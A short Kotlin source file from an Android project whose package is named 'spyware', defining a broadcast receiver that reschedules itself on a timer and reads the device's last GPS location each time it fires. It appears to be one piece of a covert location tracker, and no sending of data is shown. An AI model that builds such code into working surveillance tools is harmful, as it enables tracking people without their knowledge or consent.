package com.example.spyware

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.example.spyware.common.Constants.Companion.timerSeconds

class AlarmReceiver: BroadcastReceiver() {
    private lateinit var gpsReader: GpsReader;

    override fun onReceive(context: Context, intent: Intent?) {
        AlarmManger(context).start(System.currentTimeMillis()+ timerSeconds *1000)
        gpsReader=GpsReader(context)
        gpsReader.getLastLocation()

    }
}